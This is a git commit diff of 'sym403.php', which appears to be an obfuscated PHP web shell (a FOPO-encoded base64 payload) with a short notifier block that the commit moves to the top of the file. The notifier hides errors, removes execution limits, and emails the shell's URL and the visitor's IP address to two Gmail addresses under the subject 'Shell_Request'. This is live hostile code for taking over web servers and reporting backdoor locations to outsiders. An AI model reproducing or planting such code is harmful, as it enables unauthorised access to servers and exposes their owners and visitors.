0f4185876f90e9b546a3ed639f0d03b131e105ce
PreEdaetor <73938089+PreEdaetor@users.noreply.github.com>
2020-11-29 14:00:59 +0700

    Update sym403.php

--- sym403.php
+++ sym403.php
@@ -1,4 +1,11 @@
 <?php
+@ini_set('output_buffering', 0); @ini_set('display_errors', 0); set_time_limit(0);
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8'); $to = 'lambangwes@gmail.com, mrhorden007@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($to, "Shell_Request", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+?><?php
 /*
 Obfuscation provided by FOPO - Free Online PHP Obfuscator: http://www.fopo.com.ar/
 This code was created on Friday, November 17th, 2017 at 8:33 UTC from IP 94.129.236.62
@@ -2036,14 +2043,4 @@ g5UmpLVlQ4UFJ2TlZldGtvOG1aTGZ6dWJSSlBlMFFXdlR6eW02ZFRXMG9IRWd1QlJ4TG5RbU1sekVzVl
 NM1lFajZvOWt6aWNPay81dEtEQ0dJTGlPT012Rk16SWJiWEoxb0xRcmpZZnNhV0VIdzRYZE5sNDZUZGl1
 emZVMmtGSUVTbmIrcDRlMUE5em84cm9Da3FUTzJIdmR0eHlha08rTFZGWDR1UE9WalBMWXA5TS8vL0NKa
 XMvM2UzLzhBIikpKSk7"));
-?><?php
-@ini_set('output_buffering', 0);
-@ini_set('display_errors', 0);
-set_time_limit(0);
-ini_set('memory_limit', '64M');
-header('Content-Type: text/html; charset=UTF-8');
-$to = 'lambangwes@gmail.com, mrhorden007@gmail.com';
-$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
-mail($to, "Shell_Request", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
 ?>
